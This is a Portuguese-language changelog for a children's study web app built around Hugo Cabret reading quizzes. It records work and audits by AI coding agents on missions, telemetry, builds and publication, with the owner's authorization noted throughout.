# Changelog

## 2026-09-08 — Trilha: oito achados da auditoria do Codex

Auditoria do Codex sobre `5158477`, tratada como hipóteses e reproduzida antes de mexer.
Todas as oito se confirmaram.

1. **Planilha sem capítulo até reimplantar o Apps Script** (alta). O servidor em
   produção tem 28 campos e descarta o 29º; como o reenvio é deduplicado por
   `evento_id`, as linhas gravadas antes da reimplantação ficam sem capítulo para
   sempre. Correção de código não existe: a ação é de Marco (reimplantar). Guia e
   plano passaram a dizer isso sem eufemismo; `Q1xx` identifica o capítulo 1, `Q2xx`
   fica ambíguo entre 2 e 3.
2. "Copiar resultados" também no mapa, quando há linhas locais: a tela final aparece
   uma vez só e o fallback manual não podia depender dela.
3. Medalhas quebram linha e encolhem no celular: 16 numa linha estouravam 390 px.
4. O cartão de fim de capítulo passa a ser desenhado pelo próprio mapa enquanto
   estiver pendente: abrir "Minhas pistas" ou trocar de tela não o apaga mais.
5. Tela final ganhou "Parar por hoje" ao lado de "Rever uma missão".
6. A importação de progresso legado lê pela mesma cascata do armazenamento
   (`window.storage`, `localStorage`, memória), não só pelo `localStorage`.
7. A importação virou incremental por origem: guarda quanto XP já foi creditado e
   quais medalhas já vieram, então uma aba antiga que continuar em uso ainda entrega
   o que fizer depois, sem somar duas vezes. O carimbo `true` da versão anterior é
   convertido sem recréditos.
8. O build passa a rejeitar uma questão própria com o id de uma cópia emprestada na
   mesma missão (checagem por objeto e por missão), provado com um JSON temporário.

Verificação: 31 testes (quatro novos de importação), oito páginas construídas, e no
navegador: cartão sobrevive às pistas e some ao continuar, "Copiar resultados" no
mapa, "Parar por hoje" na tela final, medalhas sem rolagem horizontal a 390 px.


## 2026-09-08 — Auditoria do commit 5158477

- Auditoria somente de leitura da implementação, com revisores separados para
  integração, persistência e pedagogia. Sem correção de código ou publicação.
- Os 28 testes existentes passaram. Os quatro endereços públicos responderam
  HTTP 200 com HTML idêntico; banco atual e conteúdo das 16 missões preservados.
- GET de diagnóstico do endpoint publicado confirmou 28 campos. O cliente novo
  envia o capítulo, mas o receptor antigo o descarta; mock confirmou que reenviar
  o mesmo evento após atualizar o receptor retorna duplicado, sem preencher o campo.
  Não foram enviados POSTs reais nem consultados resultados individuais.
- Cenários sintéticos no Chrome local: em 390 px o documento mede 458 px por causa
  das 16 medalhas; consultar pistas e voltar remove o cartão de capítulo; a tela
  final não oferece saída de descanso equivalente à revisão. Passagem 7→8 e
  preservação da pessoa funcionaram. Servidor local encerrado após a conferência.
- O build aceita colisão de questao_id dentro da missão quando coincide com um
  item emprestado; reproduzido em memória, sem alterar o banco real.
- Confirmado no navegador: após sair da primeira tela final e refazer uma missão,
  Copiar resultados permanece oculto e não há outra entrada de exportação no mapa.
- Revisão de persistência reproduziu em VM: importação ignora dados de
  window.storage e o carimbo único ignora avanços posteriores de uma aba legada.
  Esses cenários são condicionais; não se afirmou perda de progresso real da aluna.
- Findings entregues com referências de código. Somente todo/changelog alterados;
  plano, aplicação e dados de prova permanecem como no commit auditado.

## 2026-09-08 — Hugo: trilha em capítulos num artefato só

Implementação do plano `guides/student-progress-dashboard-plan.md` (Codex + revisão
final de Claude), autorizada por Marco em 08/09.

- **Conteúdo**: `data/provas/2026-09-hugo-trilha-y5.json` funde os encontros 1, 2 e 3
  em 16 missões e três capítulos (`capitulos` com `capitulo_id`, `funcao`, `contexto`
  e `recuperacao`), mantendo o `prova_id` do encontro 1 e todos os ids de missão e
  questão. Os três JSONs antigos saíram; `publication-routes.json` aponta os quatro
  nomes públicos para a trilha, então nenhum link quebra.
- **Motor**: mapa por capítulo (atual expandido, outros recolhidos, estado por ícone e
  palavra); concluir a última missão de um capítulo abre a primeira do seguinte no
  mesmo mapa; pausa da 2ª/4ª missão conta dentro do capítulo; cartão de fim de
  capítulo com pergunta de recuperação opcional e "Conferir uma possibilidade";
  "Parar por hoje" e "Continuar no mapa" com o mesmo peso; "Minhas pistas" reúne os
  cartões de regra das missões concluídas; tela final só uma vez, com "XP acumulado
  neste artefato", sem lista de erros antigos e com no máximo uma sugestão de releitura
  da última missão; importação idempotente do progresso legado dos encontros 2 e 3;
  fila legada das três provas anteriores. Correção achada no caminho: `rotulos()`
  quebrava com mais de dez missões.
- **Telemetria**: 29ª coluna `capitulo_id`; `contexto` vem da missão ou do capítulo.
  `enviar.gs` ganha o campo e `garantirCabecalho_`, que acrescenta a coluna numa aba
  existente. **Pendente de Marco: reimplantar o Apps Script**; até lá o servidor de 28
  campos ignora o 29º sem perder nada.
- **Build**: `capitulos` validados (contíguos, ids únicos, contexto no enum);
  `banco_de: {missoes}` interno com carimbo da missão de origem; duplicidade de
  `questao_id` liberada só para cópias emprestadas; `progresso_legado` validado.
- Guia do responsável, README e CLAUDE.md descrevem capítulos, cartão, pistas e a coluna 29.

Produção: JSON, rotas, Apps Script e docs por Claude; motor por agente Opus e build/testes
por agente Sonnet, em paralelo e em arquivos separados. Verificação: 27 testes, seis
builds (trilha, quatro rotas e provas antigas), e no navegador: cartão de capítulo,
"Parar por hoje", desbloqueio da missão 8, "Minhas pistas", tela final uma vez e volta
ao mapa com a nota de percurso concluído.
Auditoria independente (dois agentes Sonnet): 8 achados, todos corrigidos. O mais grave
era de publicação: o workflow só construía JSONs existentes, e os nomes antigos dos
encontros dariam 404 no próximo deploy; agora `scripts/build-all.mjs` gera provas e
rotas, e o workflow e o teste usam o mesmo script. Os demais: contagem de colunas na
documentação, cadeado reaproveitado no capítulo futuro, frase do intervalo no último
capítulo, placeholder no changelog.


## 2026-09-08 — Plano do painel infantil de evolução

- Visão final consolidada no mesmo plano após a revisão do Claude e análise
  adversarial técnica/pedagógica. Retirados histórico de rodadas e comparação
  infantil; mantidos progresso acumulado, capítulos, recuperação oral opcional
  com conferência, pistas e compatibilidade limitada dos dados existentes.
- Corrigidas premissas sobre ausência de dados no Sheets, banco interno por
  missão de origem, aliases, implantação prévia da 29ª coluna e frases do final.
  Recomendação de executor fundamentada em continuidade e preços-base oficiais,
  sem alegar comparação controlada entre modelos. Nenhum arquivo novo criado;
  sem alteração da aplicação ou publicação.
- Atualização a partir da conversa com Claude enviada por Marco: artefato único
  com 3 capítulos e 16 missões, mapa persistente autoral, transições internas,
  identidade mantida, pausas por capítulo e fechamento leve antes do painel final.
- Planejadas migração por pessoa, preservação da URL pública e de rotas antigas,
  contexto efetivo por missão e contrato de telemetria a discutir. Consulta
  independente de arquitetura incluiu o reuso de IDs de questão entre capítulos;
  critérios de aceitação e fases ajustados. Conferidas contagens no JSON,
  estrutura do Markdown e diff; nenhum código ou conteúdo de prova alterado.
- Documento `guides/student-progress-dashboard-plan.md` preparado para discussão
  com Claude: quatro blocos de encerramento, álbum de ideias e comparação factual
  por artefato e pessoa. Exemplos fictícios, sem dados individuais reais.
- Recompensas previsíveis por participação, apoios acolhidos, saída satisfatória
  e animação dispensável; referências primárias para orientar o feedback.
- Contrato proposto de histórico local separado da fila, rodadas e tentativas,
  versões, deduplicação, atualização de conteúdo e estados sem comparação.
- Revisões de pedagogia e arquitetura em paralelo. Incorporadas distinção entre
  estabilidade e dificuldade, data/hora original da resposta e política para
  atualização incompatível com uma rodada aberta.
- Entrega apenas documental. Nenhuma alteração de aplicação, build, commit ou
  publicação. Implementação aguarda a discussão solicitada pelo Marco.

## 2026-09-08 — Hugo: revisão pedagógica do Codex sobre a estrutura narrativa

O Codex auditou o commit `62ba9c9` e levantou seis hipóteses pedagógicas e duas
técnicas. Todas foram confirmadas e corrigidas; nada foi tratado como certo sem
reproduzir no código ou no conteúdo.

- **Clímax** deixa de ser "maior perigo" e passa a "momento de maior tensão, quando
  tudo pode virar", em cartões, aulas, cola do encontro 3, dicas e explicações. A
  cena dos trilhos continua sendo a resposta para Hugo, mas pelo critério certo.
- **Situação inicial** deixa de ser "antes de qualquer problema" (contradizia um Hugo
  já escondido) e vira "como encontramos os personagens, com as dificuldades que
  já existem". Cartão do encontro 2, cola do encontro 3, aulas e Q201 alinhados.
- **Desfecho ensinado antes de ser cobrado**: a aula do encontro 1 agora conta o
  final (família, palco da Academia, novo autômato que escreve o livro); o guia do
  responsável pede localizar essas páginas no livro.
- **Prática dos quatro marcos**: as missões de estrutura dos encontros 1 e 2 deixam
  de sortear 2 de 4 e aplicam as quatro questões, na ordem cenário → problema →
  clímax → desfecho. Encontros 1 e 2 passam a 16 questões; o 3 segue com 14. É a
  única missão sem sorteio; as alternativas continuam embaralhadas.
- **Variação no encontro 2**: Q203 passa a identificar o clímax numa cena inventada
  (transferência do conceito); Q204 pergunta o que muda do começo ao fim.
- **Exemplo de Isabelle** corrigido: "três frases", e a explicação separa ação,
  fato do começo e situação-problema.
- **BNCC**: o tema passa a EF35LP29 (cenário, personagem central, conflito,
  resolução), ainda `bncc_conferida: false`.
- **motor**: `isOpen` passa a considerar aberta toda missão já concluída. Inserir
  uma missão antes de outra não tranca mais uma medalha conquistada. Teste novo.
- **encontro 3**: o bloco ampliado com o tema novo ganhou id novo
  (`mistura-cenas-marcos-e3`), para uma conclusão antiga não valer pelo conteúdo novo.
- Testes ajustados (missão sem sorteio, totais por encontro) e arquivos editados por
  script devolvidos a LF: o teste do payload fatia o motor por `
` e quebrava com CRLF.

Verificação: validador sem erros, build dos quatro HTMLs e da prova original, 18
testes, e no navegador: progresso simulado com Causa concluída antes da inserção
continua aberto com medalha; a missão nova aplica os quatro desafios na ordem.
Auditoria independente da rodada (Sonnet): 5 achados, todos corrigidos: cartão de
enredo ainda dizia "maior perigo"; cartões da prova original e do encontro 1 sem
"situação inicial"; "maior perigo" no enunciado de Q104; exemplo de Isabelle repetido
nos dois encontros (o do encontro 2 passou a Georges); enunciado de Q203 encadeado demais.


## 2026-09-07 — Hugo: estrutura narrativa a pedido da psicopedagoga

A psicopedagoga da Alícia testou o encontro 1 (perfil "Fernanda (teste)") e pediu
que toda proposta sobre livro cubra enredo, personagens principais,
situação-problema, cenário, clímax e desfecho. Enredo e personagens já tinham
missão; os outros quatro não apareciam nomeados em nenhum arquivo de Hugo.

- **catálogo**: tema `POR.LEI.ESTR` (estrutura narrativa, EF35LP26, `bncc_conferida: false`).
- **prova original** (`2026-09-hugo-cabret-y5.json`, fonte histórica, não publicada
  pela rota atual): missão "O painel de partidas" em 3ª posição, ferramenta `montar`
  com três itens (os quatro marcos; a noite do clímax; o desfecho até o novo
  autômato), banco de 7 questões `POR.LEI.ESTR.Q1–Q7`, sorteio [1,2,3]. Passa a
  7 missões e 21 questões por sessão.
- **encontros 1 e 2**: missões `estrutura-e1` e `estrutura-e2` (ferramenta
  `investigar`, dois exemplos cada), questões `Q101–Q104` e `Q201–Q204`. Cada
  encontro passa a 7 missões e 14 questões; pausas continuam após a 2ª e a 4ª.
- **encontro 3**: `mistura-cenas-e3` sorteia também do tema novo (banco do
  encontro 2) e ganha o critério na cola. Total do encontro: 14 questões.
- **vocabulário nos itens existentes**: "clímax" em SEQ.Q7, "desfecho" em SEQ.Q6 e
  SEQ.Q203, marcos na "Dica de prova" da missão de enredo. IDs preservados: a
  exigência das questões não mudou.
- Guia da sequência, README e teste de sorteio atualizados para 7 temas / 14 questões.

Produção: dois redatores em paralelo (Sonnet), revisão minha antes da mesclagem
(regra ambígua, distrator inventado, dica e enunciado que entregavam a resposta,
inconsistência entre ficha do montar e a questão de desfecho). Auditoria
independente em duas frentes (fatos/coerência e didática/vazamentos):
17 achados, todos corrigidos. Fatos (3): "situação inicial" cobrada no encontro 2
sem constar do cartão e da cola; três distratores que inventavam fatos, trocados
por confusões entre elementos reais; "próximos" impreciso em SEQ.Q203. Didática
(14): exemplos da ferramenta `investigar` que repetiam quase palavra por palavra
a resposta de Q101, Q201 e Q202 (reescritos com cenas de Isabelle e dos relógios);
andaime de SEQ.Q6 que entregava a ordem pronta (virou perguntas); alternativa
correta de desfecho mais longa que os distratores em Q4, Q104 e Q204; dicas de Q5
e Q202 que entregavam o raciocínio; distrator defensável em Q1; Q4 e Q6 apoiadas
no mesmo fato (Q4 passou a família + homenagem); aula do encontro 2 em duas telas;
cartões em três linhas; cola do encontro 3 enxugada.

Verificação: validador de conteúdo (0 erros nos quatro arquivos), build dos
quatro HTMLs e da prova original por cópia temporária, 17 testes aprovados,
encontro 1 e prova original conferidos no navegador (3 telas de aula, portão da
ferramenta, fechamento, cartão de regra e primeira questão).


## 2026-09-07 — Botão anterior e identidade mantida entre encontros

O botão anterior agora tem o mesmo tamanho, contraste e comportamento visual
do próximo. Na navegação pelos dois botões, a pessoa selecionada é repassada
ao encontro de destino por uma passagem de uso único na mesma aba, válida por
um minuto. Nome ausente da prova, destino diferente, passagem inválida ou falha
de armazenamento devolvem à escolha normal. Abertura independente e recarga
continuam pedindo a pessoa; o controle "trocar" permanece disponível.

A identidade ativa fica na página: uma escolha em outra aba não muda a autoria
de seus eventos. O progresso continua separado por prova e pessoa. O CLAUDE.md
registra a exceção de navegação solicitada por Marco.

Verificação: 17 testes e sete builds aprovados; auditor independente sem achados.
No navegador, conferidos avanço e retorno sem nova escolha, retomada do progresso
do encontro anterior, troca explícita de pessoa, reabertura com escolha e botões
em 390 e 1100 px, inclusive no modo foco. Publicação no mesmo endereço do Pages.

## 2026-09-07 — Próximo encontro com mais destaque

A pedido de Marco, o link de avanço no mapa e no encerramento ganhou aparência
de botão: fundo verde escuro, texto branco maior, altura mínima de 54 px e
largura completa no celular. Foco de teclado explícito e destaque preservado
no modo foco. O link anterior mantém aparência secundária.

Verificação: navegador em 390 e 1100 px, sem rolagem horizontal, modo foco e
navegação para o encontro 2 conferidos; builds e os 12 testes existentes aprovados.
Publicação pelo workflow do Pages no mesmo endereço de Hugo.

## 2026-09-07 — Substituição de Hugo preservando o link público

Marco autorizou publicar e manter o endereço
`https://mattusca.github.io/missao-estudos/2026-09-hugo-cabret-y5.html`.
O build usa `data/publication-routes.json` para gerar nesse caminho o conteúdo
do encontro 1, sem redirecionamento e sem duplicação do JSON. A fonte histórica
permanece preservada, e o novo `prova_id` mantém o progresso separado do teste
anterior. O índice apresenta essa entrada uma vez; o encontro 2 retorna para
o endereço compartilhado. Guias e README refletem a substituição.

Doze testes locais aprovados, incluindo igualdade entre os HTMLs do endereço
antigo e do primeiro encontro, navegação de volta e identidade do progresso.
O auditor independente identificou uma fila offline que ficaria sem reenvio
após a troca de identidade. Corrigido: o encontro 1 migra os eventos antigos,
deduplica por identidade e só remove a origem após gravar a nova fila. Uma falha
de armazenamento preserva a origem. A correção foi rechecada e aprovada pelo auditor.
A implantação usa o workflow existente com o segredo de telemetria.
Publicado no commit `1c33536`: [Action concluído com sucesso](https://github.com/mattusca/missao-estudos/actions/runs/34146074968).
As três páginas responderam HTTP 200 com as identidades, os links e a configuração
de telemetria esperados. O endereço original foi aberto no navegador e o mapa do
primeiro encontro foi conferido visualmente com Marco (teste), sem enviar respostas.
Resta ao responsável conferir o acesso no aparelho usado para estudar.

## 2026-09-07 — Hugo: ensino, aplicação e recuperação em três encontros

Implementada, com autorização de Marco, sequência para 07–08/09 antes da prova
de 09/09. Cada novo arquivo tem `prova_id` próprio e 12 questões. Encontros 1 e 2
trabalham os seis temas em blocos, com 24 questões inéditas cada; o terceiro
mistura três temas por missão e usa o banco do segundo, preservando identidades.
O uso do terceiro encontro depende de base e disposição, não do placar.
O roteiro `guides/hugo-study-sequence.md` orienta leitura do livro, conversa
breve, intervalos e ajustes após a leitura do próximo log. Não há adaptação automática.

Conteúdo escrito por agente Sol e implementação delimitada por Terra, em paralelo.
Revisores independentes examinaram conteúdo e engenharia após a implementação.
Os seis grupos de achados pedagógicos foram corrigidos e rechecados: ambiguidade
de gabarito, ordem já entregue no enunciado, definições no cartão de apoio,
confusão entre imagem e comprovação histórica, distratores pouco plausíveis,
abstrações sem explicação e cronologia não confirmada. A auditoria também conferiu
as três fontes do guia. Dois destaques que fragmentavam palavras foram corrigidos.

Nova ferramenta `investigar`: escolha e confirmação separadas, segunda tentativa
antes da explicação, avanço permitido após concluir mesmo sem acerto, alternativas
embaralhadas e nenhum XP ou evento de questão por usar a ferramenta. Aulas curtas,
fechamentos orais e SVGs originais para enquadramento e sequência de ações.
As demais acomodações foram preservadas. Removido o contador visível da pausa,
mantendo a sugestão de descanso. Mensagens finais deixam de afirmar domínio;
“Rever uma missão” retorna ao mapa sem zerar o progresso. Negritos dentro da cola
deixaram de quebrar o texto em linhas como se fossem títulos.

Novas sessões incluem o `prova_id` no identificador; sessões antigas retomadas
mantêm o ID até expirar. As 28 colunas e o Apps Script não mudaram. Tempos de aula,
ferramenta e leitura do feedback continuam sem medição direta. O build valida a
ferramenta, o perfil de teste e a trilha; o índice apresenta títulos e encontros
em ordem, listando somente HTMLs gerados. O validador editorial passou a aceitar
arquivos por argumento, aulas de uma a três telas e missões intercaladas.

Na versão inicial, corrigidas explicações sobre imagens e fotogramas, distinção
entre ordem e causa e heurísticas de escolha. Alterações que mudaram a demanda
ou o apoio de itens antigos receberam IDs novos (`VOCAB.Q8`, `FORMA.Q8/Q9`);
os novos encontros usam `Q101–Q104` e `Q201–Q204`. Nada reescreve o log histórico.

**Verificação final:** sete builds aprovados, nove testes Node aprovados,
zero erros e avisos editoriais nos três encontros novos. Testes exercitam
tentativas, portão, embaralhamento, sessão legada e nova, banco emprestado,
50 sorteios por encontro e payload de 28 campos. Navegador em 390 × 844,
perfil Marco (teste): encontro 1 completo, interações de revisão e parte do
encontro 3; escolhas, segunda tentativa, ferramentas, figuras, pausas sem contador,
retomada de missão incompleta, XP/medalhas/foco e progresso separado no encontro 2.
Conferidos títulos/links e ausência de transbordamento horizontal nas telas
inspecionadas. Testes locais sem `SHEET_URL`; servidor de teste encerrado e
dimensão do navegador restaurada. Nenhum commit, push ou publicação realizado.

O roteiro da professora e a conferência dos episódios na edição utilizada
continuam pendentes. Não se registraram resultados individuais nesta entrega pública.

## 2026-09-07 — Convivência implementada e guia narrativo compartilhado

Com autorização de Marco, `AGENTS.md` passou a ser uma entrada curta que exige a
leitura do `CLAUDE.md`. A nova seção 0 do arquivo comum define responsabilidades,
passagem de trabalho, preservação das edições existentes e alternância de autoria
e revisão. Ambos podem liderar a narrativa completa; Codex também tem como frente
preferencial engenharia e verificação. As regras pedagógicas anteriores foram preservadas.

Criado `guides/narrative-guide.md`, ligado a ambos os arquivos e ao README: percurso
da missão, voz, função de cada apoio, questões autossuficientes, continuidade com a
interface, verificação factual e fluxo editorial. Revisão independente identificou
uma ambiguidade na missão de referência: corrigida para que revisões intercaladas
continuem sem aula e sem ferramenta. Ajustes pequenos mantêm revisão proporcional.

**Aplicação em Hugo Cabret** — apenas `aula.corpo` e `aula.fechamento` da missão
Enredo foram alterados. O convite às fichas agora começa por "A ordem deixa pistas";
o fechamento orienta lembrar a cena e o que ela tornou possível, removendo a
instrução de consultar uma seta que já não existia no cartão.

**Verificado** — build de Hugo com `SHEET_URL` vazia; validador com 0 erros e os
mesmos 6 avisos de comprimento anteriores à edição; comparação estrutural confirmou
que os dois campos da aula foram as únicas mudanças no JSON; 7 links locais dos
documentos resolvidos. Navegador em 390 × 844, perfil Marco (teste): missão inicial
concluída para abrir Enredo, confirmação em dois toques observada, novo convite e
fechamento legíveis, ferramenta bloqueia avanço até interação. Janela de teste
fechada e tamanho do navegador restaurado; servidor local encerrado ao final.
Conferência factual do livro e alinhamento ao roteiro seguem pendentes. Sem publicação.

## 2026-09-07 — Complemento: papel do Codex na narrativa dos artefatos

Leitura editorial de exemplos das aulas, questões, dicas e explicações de Hugo
Cabret, Language Arts e Matemática. A proposta de responsabilidade foi ampliada:
Codex também pode assumir direção narrativa, coautoria e edição didática, com
alternância entre autor e revisor conforme o artefato. A divisão anterior não
deve ser interpretada como exclusividade de conteúdo para o Claude.

Critérios propostos: cena com função no conteúdo; uma ideia por tela; ligação
entre aula e interação; feedback que explica o raciocínio; voz consistente;
questões autossuficientes para sorteio e intercalação. Revisões intercaladas
preservam recuperação direta, sem acrescentar aula. Exemplo de continuidade
identificado: fechamento de Enredo manda consultar a sequência e a seta seguinte
no cartão, embora a regra atual não apresente essa sequência. Registrado em
pendências. Verificação por leitura dos JSONs e do histórico; conteúdo das provas
e instruções dos agentes não foram alterados.

## 2026-09-07 — Leitura do projeto e proposta de convivência Codex/Claude

Leitura das orientações, README, pendências e histórico, com exploração estática
da arquitetura por subagente. Papel proposto para o Codex: engenharia e revisão
independente de integração, persistência, telemetria e acomodações; continuidade
de conteúdo com o Claude e decisões pedagógicas com Marco. É uma recomendação,
não uma alteração das responsabilidades ou das instruções do repositório.

`CLAUDE.md` e `AGENTS.md` têm conteúdo idêntico (SHA-256 conferido); `AGENTS.md`
já estava não versionado no início. Proposta: manter a referência comum no
`CLAUDE.md`, como orienta o README, e futuramente usar `AGENTS.md` como entrada
curta que exija essa leitura e acrescente instruções operacionais do Codex.
Referência oficial consultada: https://learn.chatgpt.com/docs/agent-configuration/agents-md

**Oportunidades identificadas** — contrato de retenção entre servidor e dashboard
(`questao_id` ausente na seleção de campos do servidor); validador de conteúdo
existente, mas com caminho absoluto e prova fixa, fora do workflow; exemplos de
matemática ainda embutidos no motor. Pendências antigas também divergem do código
e do histórico. Achados registrados para trabalho posterior, sem correção nesta sessão.

**Verificação** — build dos quatro JSONs concluído com sucesso e `SHEET_URL` vazia
no processo; saída local em `docs/`. Comparação das instruções e inspeção do diff
dos registros. Sem teste de navegador ou da implantação: o achado de retenção é
estático e o build não verifica esse contrato. Atualizados somente os registros
em `tasks/`, além das saídas locais geradas. Nenhum commit, push ou envio de eventos.

## 2026-09-07 (tarde) — Hugo Cabret: reescrita narrativa e auditoria

A v1 estava correta e fria: aula em lista, enunciado de gabarito, distrator bobo,
dica que entregava o fato. Reescrita completa do texto das 6 missões, sem mudar
ids, dificuldades, ferramentas, sorteio nem figuras.

**Método** — guia de reescrita (voz única, 3 telas por aula: cena → ideia pelo
exemplo → por que importa; enunciado ancorado numa cena; dica aponta, não entrega;
explicação com o porquê e uma frase que gruda; distrator = confusão real do livro;
"mais didático ≠ mais texto") + ficha de fatos do livro. Três redatores (Sonnet) em
paralelo, dois missões cada; dois auditores independentes (fatos/coerência em Sonnet,
didática/voz em Opus). 35 findings ao todo, todos corrigidos.

**Achados que valem lembrar**
- Alternativa certa 1,5–2,5× mais longa que os distratores em 8 questões: atalho de
  layout que o log leria como domínio. Reequilibrado; o validador agora avisa acima de 1,35×.
- Passos do andaime respondendo a própria pergunta em 6 questões ("…? Georges.").
  Andaime é organização, não dica: cortadas as respostas coladas.
- Cartão de regra entregando gabarito: Linha do tempo (a sequência era a resposta da
  Q3, `alternativas_fixas`), Vocabulário (seis definições = seis gabaritos), Forma
  (revelava o narrador). Cartão virou critério de decisão, como manda a seção 4.
- Fato errado: Étienne não leva Hugo à Academia; Labisse indica, Étienne ajuda lá.
- Quadro da aula grudado na tela 1 em 3 missões (assinatura de autor): movido para a
  tela 2 em todas.
- Títulos viraram lugares da estação (loja de brinquedos, passagens secretas, oficina
  dos relógios, alto do relógio de vidro, caixa de ferramentas, sala de cinema).

**Verificado** — validador final (0 erros): 3 telas por aula, box na tela 2, alvos do
`destacar` casando, `montar` com a ficha nova ("é ela quem gira a chave"), conector com
1 ok por par, passos 3–4 nas de nível 3, tags fechadas. Build OK. No navegador: as 6
aulas fatiam em 5 telas, portão arma e destrava no `montar`.

## 2026-09-07 — Prova de Hugo Cabret Y5 (primeira versão)

Terceira prova do sistema, primeira de Português e primeira sobre um livro.
Proposta em `tasks/proposta-hugo-cabret.md`; implementada sem roteiro da
professora, a partir de guias de leitura (Scholastic, Ferguson Library, Reed Novel
Studies grade 5, SM). **Ajustar ao roteiro quando ele chegar.**

**Catálogo** — seis temas novos `POR.LEI.*` (PERS, SEQ, CAUSA, TEMA, VOCAB, FORMA),
eixo Leitura, com códigos BNCC de 5º ano marcados `bncc_conferida: false`.

**Conteúdo** — `data/provas/2026-09-hugo-cabret-y5.json`: 6 missões, 18 questões por
sessão de um banco de 41, dificuldade média 1,95. Zero mudança no motor: as quatro
ferramentas de língua cobriram tudo (`destacar` ×3, `montar`, `conector` ×2 — a segunda
como lacuna de vocabulário). Duas figuras SVG próprias (Lua com foguete, engrenagens).
Nenhum desenho do Selznick reproduzido; frases do livro em paráfrase. As questões são
autossuficientes de propósito: nenhuma depende do texto do cartão, o que deixa os seis
temas prontos para uma revisão intercalada.

**Decisões da v1** — Português (não Language Arts); sem comparação livro × filme; sem
ferramenta nova `fotogramas` (fica na proposta); sem áudio/audiobook (reexposição em vez
de recuperação, direitos autorais e arquivo único offline); missão de abertura é
Personagens, por ser a mais segura para não ancorar impressão negativa.

**Corrigido durante o teste** — no celular a figura da Lua (viewBox 200×120) empurrava a
1ª alternativa para y=816 numa tela de 812, o mesmo problema que o texto de leitura teve
em LA. Figuras redesenhadas largas e baixas (320×100 e 300×100): 1ª alternativa em
y=731 e y=762.

**Verificado no navegador** (tablet e celular, `node scripts/servir.mjs`): identidade →
mapa → aula fatiada → portão de um toque nas três ferramentas (`destacar`, `montar`,
`conector`) → dois toques → +100 XP com explicação. Por script na página publicada: os
18 alvos de `destacar` casam com as frases, as 3 ordens de `montar` batem com as fichas,
os 8 pares de `conector` têm exatamente uma opção certa, `passos` presentes nas 11
questões de nível 3, ids únicos. Retomada e telemetria são do motor, inalterado.

**Não feito** — revisão intercalada (`2026-09-revisao-hugo-y5`), revisão factual por
adulto que leu a edição SM, e commit/push: ficam para a próxima sessão.

**Ferramental** — `.claude/launch.json` para subir `scripts/servir.mjs` pelo preview.

## 2026-08-25 (noite) — Prática intercalada, portão da aula e retenção

Escopo fechado a partir de pesquisa, não de palpite. Três itens que estavam na lista
foram **cortados** por não terem lastro — e um deles tinha pesquisa contra (ver
"Descartados" em `tasks/todo.md`).

**Motor — missão intercalada** (`missao.intercalada`)
- `sorteio.por_tema: [1,2]` roda o plano de dificuldade **dentro de cada tema**.
  Seis temas × 2 = doze questões.
- Permutação garante que duas questões consecutivas nunca sejam do mesmo tema. Guloso
  por maior grupo restante, com desempate sorteado — o determinístico ciclava na mesma
  ordem de temas e a segunda metade repetia a primeira, decorável.
- A ordem **dentro** do grupo também é sorteada. Sem isso o intercalar tirava sempre o
  primeiro item de cada tema e a missão virava rampa: as seis fáceis, depois as seis
  difíceis, toda vez. Previsível, e jogava o fracasso todo para o fim — que é onde o log
  dela de 25/08 já mostrava queda. Medido depois da correção: dificuldade média plana em
  ~1,50 nas doze posições.
- `missao.regras` vira a **cola**: todas as regras dos temas envolvidos, nenhuma
  destacada. O cartão fixo e a intercalação brigam — se a cola anuncia o tema, a
  discriminação já está feita. A saída foi enunciar o critério de decisão sem o item
  lexical: as quatro famílias de conector estão lá, que *however* é contraste não está.
- **Telemetria passa a ler `q.tema_id ?? m.tema_id`** (idem eixo, subtema, bncc). Sem
  isso as doze linhas mentiriam o mesmo tema e a retenção mediria lixo.
- Missão intercalada não tem aula nem ferramenta: revisão é prática de recuperação, e
  reensinar antes de recuperar anula o efeito.

**Motor — portão da aula**
- Na tela da ferramenta, avançar exige um toque no widget. Veio de medida: no log de
  25/08 a aula ficou com 20% do tempo da sessão — 3,1 s por tela, em 28 telas.
- Detecção por seletor **mais** varredura de `onclick`: `destacar` e `grafico` ligam
  clique em `<span>` e em `<g>` de SVG, que nenhum seletor CSS pega. Ferramenta sem
  controle **não** trava — senão a aluna fica presa.
- Sem temporizador, e `Voltar ao mapa` continua livre estando travado.

**Build**
- Resolve `banco_de: {prova, temas}` em tempo de build, carimbando o contexto em cada
  questão. A revisão não copia questão: a fonte da verdade continua num lugar só.
- Recusa cola incompleta, `por_tema` sem banco que o atenda, `por_tema` junto com
  `dificuldades`, questão intercalada sem tema, e tema fora do catálogo.
- Balanceamento de gabarito só nas `alternativas_fixas` — o motor embaralha o resto.

**Dashboard — retenção**
- Painel "O que ficou de um dia para o outro" e linha por tema: das questões que ela
  reencontrou em **outra sessão e em outro dia**, quantas voltaram certas de primeira.
- Quadro Virou / Manteve / Escorregou / Ainda não. "Virou" é o sinal que vale mais:
  não resolveu sozinha antes, resolveu sozinha no reencontro.
- Limiar próprio de 5 reencontros, somado aos 10 eventos e 3 sessões da seção 2. Abaixo
  disso o card diz "ainda não sei dizer" com a contagem, nunca um número.
- Reencontro no mesmo dia é ignorado (mínimo de 20 h e `sessao_id` diferente). Sem essa
  regra, repetir a missão quatro horas depois marcaria 100% de retenção.

**Conteúdo**
- Language Arts: 42 → **52** questões. Toda missão passa a ter ≥2 em cada nível.
- Matemática: 21 → **42** questões, com `sorteio` derivado das dificuldades que a prova
  já aplicava.
- Novo `data/provas/2026-08-revisao-la-y5.json`: revisão intercalada de 12 questões
  sobre 6 temas, ~5 min, `contexto: revisao_espacada`. Feita para ser repetida **três
  vezes** entre uma prova e outra — o critério é 3 recuperações espaçadas, e mais
  questões numa sessão só não rende.

**Privacidade** — o nome da escola ainda estava cravado em `scripts/extrair.mjs` e era
repetido no changelog ao explicar a própria remoção. Os dois foram limpos. O histórico
do Git continua com ele desde o primeiro push.

**Auditoria** — suíte que extrai as funções reais do **HTML publicado** (não do fonte,
não de cópia). Achados corrigidos nesta rodada: rampa de dificuldade, plural do resumo do
build, "Esse tema você domina" numa missão de seis temas, preview do dashboard sem
`questao_id` (a tela nova era inauditável), e o nome da escola. Verificado no navegador:
identidade → mapa → quiz direto, cola com 6 regras, zero adjacências de tema, 12 linhas
com 6 temas distintos, 14 ferramentas travando e destravando com um toque, modo foco sem
confete, e retomada descartando a posição sem apagar linha já emitida.

**Reserva** — 8 questões de nível 3 em Language Arts existem e **não saem hoje**: o plano
das missões não pede nível 3. É headroom deliberado para a próxima calibragem, e a
auditoria imprime isso a cada rodada para não virar conteúdo esquecido.


## 2026-08-25 — Banco de questões e alternativas embaralhadas

